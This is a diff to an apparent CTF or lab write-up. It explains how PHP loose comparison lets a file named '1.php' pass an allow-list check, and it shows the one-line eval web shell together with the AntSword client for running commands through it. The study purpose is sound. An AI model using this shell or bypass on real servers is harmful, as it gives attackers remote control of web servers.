@@ -955,6 +955,8 @@ Then we can get the permission through a one-sentence ==Trojan horse==
 - allows an attacker to gain remote control of a web server.
 - It consists of a small script typically placed on a vulnerable web server.
 ## Hypothesis
-- As the probability's perspective, $1$ has bigger probability than the other numbers in `$allow`, so that we assign `1` to `n`.
+- As the probability's perspective, $1$ has bigger probability than the other numbers in `$allow`, so that we assign `1.php` to `n`.
+	- When comparing beginning, `1.php` will be regarded as $1$.
 - `content` should be the one-sentence Trojan Horse. `<?php @eval($_POST['cmd']); ?>`
 - Then we can use the [AntSword](https://www.yuque.com/antswordproject/antsword/srruro#) to run the hack command through `cmd`.
+![[Pasted image 20241207111000.png]]
